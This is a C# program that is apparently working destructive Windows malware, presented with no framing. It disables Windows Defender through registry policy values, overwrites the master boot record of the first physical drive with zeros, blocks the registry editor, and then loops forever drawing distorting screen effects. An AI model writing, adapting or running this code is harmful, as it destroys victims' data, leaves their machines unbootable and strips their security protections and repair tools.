using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

class Program
{
    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hwnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateSolidBrush(int color);

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdc_src, int x1, int y1, uint rop);

    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);

    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();

    static void Main()
    {
        DisableWindowsDefender();

        OverwriteMBR();

        RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
        key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

        SetProcessDPIAware();
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);

        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int color = (new Random().Next(0, 122) << 16) | (new Random().Next(0, 430) << 8) | new Random().Next(0, 310);
            IntPtr brush = CreateSolidBrush(color);
            SelectObject(hdc, brush);
            BitBlt(hdc, new Random().Next(-10, 10), new Random().Next(-10, 10), sw, sh, hdc, 0, 0, 0x00CC0020);
            BitBlt(hdc, new Random().Next(-10, 10), new Random().Next(-10, 10), sw, sh, hdc, 0, 0, 0x005A0049);
            ReleaseDC(IntPtr.Zero, hdc);
        }
    }

    static void DisableWindowsDefender()
    {
        string keyPath = @"SOFTWARE\Policies\Microsoft\Windows Defender";
        string valueName1 = "DisableAntiSpyware";
        string valueName2 = @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";
        string valueName3 = "DisableRealtimeMonitoring";

        Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\" + keyPath, valueName1, 1, RegistryValueKind.DWord);
        Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\" + valueName2, valueName3, 1, RegistryValueKind.DWord);
    }

    static void OverwriteMBR()
    {
        using (FileStream fs = new FileStream(@"\\.\\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] zeros = new byte[512];
            fs.Write(zeros, 0, zeros.Length);
        }
    }
}
